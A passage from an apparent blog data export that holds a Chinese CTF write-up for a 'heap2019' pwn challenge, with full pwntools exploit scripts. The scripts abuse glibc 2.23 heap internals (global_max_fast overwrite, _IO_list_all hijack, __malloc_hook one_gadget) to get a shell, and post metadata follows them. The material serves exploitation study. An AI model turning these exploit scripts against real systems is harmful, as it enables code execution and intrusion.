class=\"string\">&#x27;f&#x27;</span>*<span class=\"number\">0x98</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&#x27;aaaaaaaa&#x27;</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">ru(<span class=\"string\">&quot;aaaaaaaa&quot;</span>)</span><br><span class=\"line\">heapbase=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])-<span class=\"number\">0x140</span></span><br><span class=\"line\"></span><br><span class=\"line\">global_max_fast=libcbase+<span class=\"number\">0x3c67f8</span></span><br><span class=\"line\">_IO_list_all=libcbase+libc.sym[<span class=\"string\">&#x27;_IO_list_all&#x27;</span>]</span><br><span class=\"line\">fastbinsY=libcbase+libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]+<span class=\"number\">0x10</span>+<span class=\"number\">0x8</span></span><br><span class=\"line\">chunk_size=(_IO_list_all-fastbinsY)*<span class=\"number\">2</span>+<span class=\"number\">0x20</span>-<span class=\"number\">0x10</span></span><br><span class=\"line\">sys_addr=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># construct fake prev_size and size to bypass unlink when add</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;c&#x27;</span> * <span class=\"number\">0x28</span> + p64(<span class=\"number\">0xd8</span>) + p64(<span class=\"number\">0x61</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,payload) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># update the size</span></span><br><span class=\"line\">delete(<span class=\"number\">4</span>)</span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">add(chunk_size,<span class=\"string\">&#x27;d&#x27;</span>*<span class=\"number\">0x98</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&#x27;f&#x27;</span>*<span class=\"number\">0x98</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># delete 1 and overwrite its size to 0xde</span></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(heapbase+<span class=\"number\">0xa8</span>-<span class=\"number\">0x3</span>)</span><br><span class=\"line\">edit(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x90</span>+p64(<span class=\"number\">0</span>)+p64(chunk_size+<span class=\"number\">0x10</span>+<span class=\"number\">0xa1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0xa8</span>,payload) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 5 will not exist, put all free chunk to small bin to prevent unexpected error</span></span><br><span class=\"line\">ru(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&quot;Content length:\\n&quot;</span>)</span><br><span class=\"line\">sl(<span class=\"built_in\">str</span>(<span class=\"number\">0x100</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;g&#x27;</span>*<span class=\"number\">0x90</span>+p64(<span class=\"number\">0</span>)+p64(chunk_size+<span class=\"number\">0x11</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x14a0</span>,payload) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># write global_max_fast to 0xdead</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(global_max_fast-<span class=\"number\">0x2</span>)</span><br><span class=\"line\">edit(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># House of corrosion</span></span><br><span class=\"line\"><span class=\"comment\"># hijack _IO_list_all</span></span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\"># construct fake io</span></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(sys_addr)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x70</span></span><br><span class=\"line\">fake_io=<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>+p64(<span class=\"number\">0x1411</span>)</span><br><span class=\"line\">fake_io+=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">fake_io=fake_io.ljust(<span class=\"number\">0xd8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_io+=p64(heapbase+<span class=\"number\">0x150</span>) <span class=\"comment\"># vtable</span></span><br><span class=\"line\">payload+=fake_io</span><br><span class=\"line\"><span class=\"comment\"># overwrite 3</span></span><br><span class=\"line\">add(<span class=\"number\">0x14b0</span>-<span class=\"number\">0x10</span>,payload) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&quot;heap_list&quot;</span>,<span class=\"built_in\">hex</span>(heap_list))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;elfbase&quot;</span>,<span class=\"built_in\">hex</span>(elfbase))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;heapbase&quot;</span>,<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;global_max_fast&quot;</span>,<span class=\"built_in\">hex</span>(global_max_fast))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;_IO_list_all&quot;</span>,<span class=\"built_in\">hex</span>(_IO_list_all))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;fastbinsY&quot;</span>,<span class=\"built_in\">hex</span>(fastbinsY))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;chunk_size&quot;</span>,<span class=\"built_in\">hex</span>(chunk_size))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;sys_addr&quot;</span>,<span class=\"built_in\">hex</span>(sys_addr))</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># trigger</span></span><br><span class=\"line\">ru(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"其他思路\"><a href=\"#其他思路\" class=\"headerlink\" title=\"其他思路\"></a>其他思路</h2><p>如果按照main的思路走的话，一直到overlapping都是一样的，但overlapping的<code>chunk</code>的<code>size</code>有所不同，这里需要另其为<code>0xd0</code>，这样才能通过任意地址写<code>0xde</code>来伪造<code>size</code>。</p>\n<p>首先需要利用任意地址写<code>0xde</code>修改<code>global_max_fast</code>，让<code>0xd0</code>大小的<code>chunk</code>都能被认为是<code>fast bin chunk</code>，之后将overlapping的大小为<code>0xd0</code>的<code>chunk</code>释放到越界的<code>fast bin</code>中。</p>\n<p>打<code>__malloc_hook</code>的话，由于只能任意地址写<code>0xde</code>来伪造<code>size</code>，需要在<code>__malloc_hook</code>前面找一段<code>0x0000000000000000</code>的空间来伪造<code>size</code>。</p>\n<p>伪造好后利用overlapping修改<code>0xd0</code>大小的<code>fast bin</code>中<code>chunk</code>的<code>fd==fake_chunk</code>，之后申请两次即可得到<code>__malloc_hook</code>处的内存，修改其为<code>one_gadget</code>即可<code>get shell</code>。</p>\n<p>exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os = <span class=\"string\">&#x27;linux&#x27;</span>,arch = <span class=\"string\">&#x27;amd64&#x27;</span>,log_level = <span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">       </span><br><span class=\"line\">mode = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">1</span>:</span><br><span class=\"line\">    fang = process(<span class=\"string\">&quot;./heap2019&quot;</span>)  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    fang = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"number\">28812</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">    gdb.attach(fang)</span><br><span class=\"line\">    pause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">alloc2</span>(<span class=\"params\">size</span>):</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">    fang.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;Content length:\\n&quot;</span>)</span><br><span class=\"line\">    fang.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">alloc</span>(<span class=\"params\">size,cont</span>):</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">    fang.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;Content length:\\n&quot;</span>)</span><br><span class=\"line\">    fang.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;Content:\\n&quot;</span>)</span><br><span class=\"line\">    fang.send(cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dele</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">    fang.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;Content id:\\n&quot;</span>)</span><br><span class=\"line\">    fang.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">cont</span>):</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">    fang.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    fang.recvuntil(<span class=\"string\">&quot;Comment:\\n&quot;</span>)</span><br><span class=\"line\">    fang.send(cont)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/home/functionmain/桌面/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(fang,&#x27;b *(0x555555400000 + 0xc1d)&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># pause()</span></span><br><span class=\"line\"></span><br><span class=\"line\">fang.recvuntil(<span class=\"string\">&quot;4.exit\\n&quot;</span>)</span><br><span class=\"line\">fang.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">2019</span>))</span><br><span class=\"line\">fang.recvuntil(<span class=\"string\">&quot;0x&quot;</span>)</span><br><span class=\"line\">elf_base = <span class=\"built_in\">int</span>(fang.recv(<span class=\"number\">12</span>),<span class=\"number\">16</span>) - <span class=\"number\">0x202040</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">alloc(<span class=\"number\">0x98</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x98</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x98</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x98</span>,payload) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">alloc(<span class=\"number\">0x98</span>,payload) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">pd = <span class=\"string\">b&#x27;b&#x27;</span> * <span class=\"number\">0x98</span></span><br><span class=\"line\">alloc(<span class=\"number\">0x98</span>,pd) <span class=\"comment\"># 3</span></span><br><span class=\"line\"></span><br><span class=\"line\">pd = <span class=\"string\">b&#x27;A&#x27;</span> * <span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x71</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0x98</span>,pd) <span class=\"comment\"># 4</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0x98</span>,<span class=\"string\">b&#x27;a&#x27;</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">fang.recvuntil(<span class=\"string\">&quot;Data is:\\n&quot;</span>)</span><br><span class=\"line\">libc_base = u64(fang.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">0x3c4b61</span></span><br><span class=\"line\">one_gadget4 = [<span class=\"number\">0x45226</span>,<span class=\"number\">0x4527a</span>,<span class=\"number\">0xf03a4</span>,<span class=\"number\">0xf1247</span>]</span><br><span class=\"line\">one_gadget_addr = libc_base + one_gadget4[<span class=\"number\">3</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">2</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0x98</span>,<span class=\"string\">b&#x27;aaaaaaaa&#x27;</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">fang.recvuntil(<span class=\"string\">&quot;aaaaaaaa&quot;</span>)</span><br><span class=\"line\">heap_base = u64(fang.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">0x140</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 是0x28且size是0xd8是因为前一个chunk的size被修改为0xde，除去标志位的size就是0xd8，而寻找下一个chunk是依靠size的大小的</span></span><br><span class=\"line\"><span class=\"comment\"># 因此会认为chunk_addr+size，所以会找到0xd8的位置，并认为他是prev_size</span></span><br><span class=\"line\"><span class=\"comment\"># 正常情况下size都是0x10对齐的(64bit下)，但这里不是，所以会出现这样的情况</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;b&#x27;</span> * <span class=\"number\">0x28</span> + p64(<span class=\"number\">0xd8</span>) + p64(<span class=\"number\">0x61</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0x98</span>,payload) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x20</span> + p64(heap_base + <span class=\"number\">0xa8</span> - <span class=\"number\">3</span>)</span><br><span class=\"line\">edit(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 余下的要大于MIN_SIZE才会切割，顺便改写id==2的size</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;A&quot;</span> * <span class=\"number\">0x90</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x141</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0xa8</span>,payload) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">alloc2(<span class=\"number\">0x98</span>) <span class=\"comment\"># 5 马上free的，只是把unsorted剩下的赶进去small bin</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 放进 unsorted bin</span></span><br><span class=\"line\">dele(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x90</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xd1</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0x130</span>,payload) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 修改 global_max_fast</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x20</span> + p64(libc_base + <span class=\"number\">0x3c67f8</span> - <span class=\"number\">3</span>)</span><br><span class=\"line\">edit(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 进入 fastbinsY，越界写到了last_remainder</span></span><br><span class=\"line\">dele(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在__malloc_hook前伪造size</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x20</span> + p64(libc_base + libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>] - <span class=\"number\">0x30</span> + <span class=\"number\">8</span> - <span class=\"number\">3</span>)</span><br><span class=\"line\">edit(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 覆写fd指向fake chunk(__malloc_hook前)</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x90</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xd1</span>) + p64(libc_base + libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>] - <span class=\"number\">0x30</span> )</span><br><span class=\"line\">alloc(<span class=\"number\">0x130</span>,payload) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">alloc(<span class=\"number\">0xc0</span>,<span class=\"string\">&#x27;BBBB&#x27;</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 分配并修改malloc</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;A&#x27;</span> * <span class=\"number\">0x18</span> + p64(one_gadget_addr) + p64(libc_base + libc.symbols[<span class=\"string\">&quot;realloc&quot;</span>])</span><br><span class=\"line\">alloc(<span class=\"number\">0xc0</span>,payload) <span class=\"comment\"># 0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(fang,&#x27;b *(0x555555400000 + 0xAC9)&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># pause()</span></span><br><span class=\"line\">alloc2(<span class=\"number\">0x100</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(<span class=\"string\">&quot;elf_base : 0x%x&quot;</span> % elf_base)</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;libc_base : 0x%x&quot;</span> % libc_base)</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;heap_base : 0x%x&quot;</span> % heap_base)</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\">fang.interactive()</span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  rax == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rsp+0x30] == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rsp+0x50] == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class=\"line\"><span class=\"string\">constraints:</span></span><br><span class=\"line\"><span class=\"string\">  [rsp+0x70] == NULL</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>"}],"PostAsset":[{"_id":"source/_posts/ArmPwn/arm32register","post":"clg9czaew00075oud5gqeahje","slug":"arm32register","modified":1,"renderable":1},{"_id":"source/_posts/Misc/kernelpwn.h","post":"clg9czafc00185ouddurjamu2","slug":"kernelpwn.h","modified":1,"renderable":1},{"_id":"source/_posts/ROP/plt_and_got.jpg","post":"clg9czafk00215oud96yh586j","slug":"plt_and_got.jpg","modified":1,"renderable":1},{"_id":"source/_posts/bcloud/get_input.jpg","post":"clg9czafp002l5oud9lqbfzen","slug":"get_input.jpg","modified":1,"renderable":1},{"_id":"source/_posts/bcloud/input_name.jpg","post":"clg9czafp002l5oud9lqbfzen","slug":"input_name.jpg","modified":1,"renderable":1},{"_id":"source/_posts/bcloud/org_host.jpg","post":"clg9czafp002l5oud9lqbfzen","slug":"org_host.jpg","modified":1,"renderable":1},{"_id":"source/_posts/oreo/fake.jpg","post":"clg9czagd00585oud4mi7ftis","slug":"fake.jpg","modified":1,"renderable":1},{"_id":"source/_posts/stack_overflow/stack.png","post":"clg9czagm006a5oudhoym95iu","slug":"stack.png","modified":1,"renderable":1},{"_id":"source/_posts/stack_overflow/stack2.png","post":"clg9czagm006a5oudhoym95iu","slug":"stack2.png","modified":1,"renderable":1},{"_id":"source/_posts/shellcode_revenge/ida.jpg","post":"clg9czagl00665oudcufm4ire","slug":"ida.jpg","modified":1,"renderable":1},{"_id":"source/_posts/tinypad/hoe.jpg","post":"clg9czagn006d5oud9su8b57a","slug":"hoe.jpg","modified":1,"renderable":1},{"_id":"source/_posts/time_formatter/protect.png","post":"clg9czago006h5oud8g3oczao","slug":"protect.png","modified":1,"renderable":1},{"_id":"source/_posts/铁人三项heap2019/1673449093269-1.png","post":"clg9czagq006r5oudh5jx0qva","slug":"1673449093269-1.png","modified":1,"renderable":1},{"_id":"source/_posts/Kernel_Basic_Knowledge/2W8xIfwqm9Y7Fru.png","post":"clg9czafa00105oud96a25jsc","slug":"2W8xIfwqm9Y7Fru.png","modified":1,"renderable":1},{"_id":"source/_posts/Kernel_Basic_Knowledge/image-20230115125518678.png","post":"clg9czafa00105oud96a25jsc","slug":"image-20230115125518678.png","modified":1,"renderable":1},{"_id":"source/_posts/Kernel_Basic_Knowledge/image-20230115130938230.png","post":"clg9czafa00105oud96a25jsc","slug":"image-20230115130938230.png","modified":1,"renderable":1},{"_id":"source/_posts/Kernel_Basic_Knowledge/ivPnbsjHyI94m5z.png","post":"clg9czafa00105oud96a25jsc","slug":"ivPnbsjHyI94m5z.png","modified":1,"renderable":1},{"_id":"source/_posts/Kernel_Basic_Knowledge/MjWZmba9SLH1xIO.png","post":"clg9czafa00105oud96a25jsc","slug":"MjWZmba9SLH1xIO.png","modified":1,"renderable":1},{"_id":"source/_posts/Kernel_Basic_Knowledge/sOwdI5YMNUjLSib-1678172668801-7.png","post":"clg9czafa00105oud96a25jsc","slug":"sOwdI5YMNUjLSib-1678172668801-7.png","modified":1,"renderable":1},{"_id":"source/_posts/Kernel_Basic_Knowledge/sOwdI5YMNUjLSib.png","post":"clg9czafa00105oud96a25jsc","slug":"sOwdI5YMNUjLSib.png","modified":1,"renderable":1},{"_id":"source/_posts/Kernel_Basic_Knowledge/wLzFuCB5n1DAIY7.png","post":"clg9czafa00105oud96a25jsc","slug":"wLzFuCB5n1DAIY7.png","modified":1,"renderable":1},{"_id":"source/_posts/Kernel_Basic_Knowledge/ciscn_2019_n_3/check.png","post":"clg9czafa00105oud96a25jsc","slug":"ciscn_2019_n_3\\check.png","modified":1,"renderable":1},{"_id":"source/_posts/heap_attack/FastbinDoubleFree.png","post":"clg9czafz003o5oudfcosesh3","slug":"FastbinDoubleFree.png","modified":1,"renderable":1}],"PostCategory":[{"post_id":"clg9czaex00085oudh9qa1v8t","category_id":"clg9czaet00045oudebln8bqy","_id":"clg9czaf2000e5oudauor0d5h"},{"post_id":"clg9czaen00015oud0g881bvj","category_id":"clg9czaet00045oudebln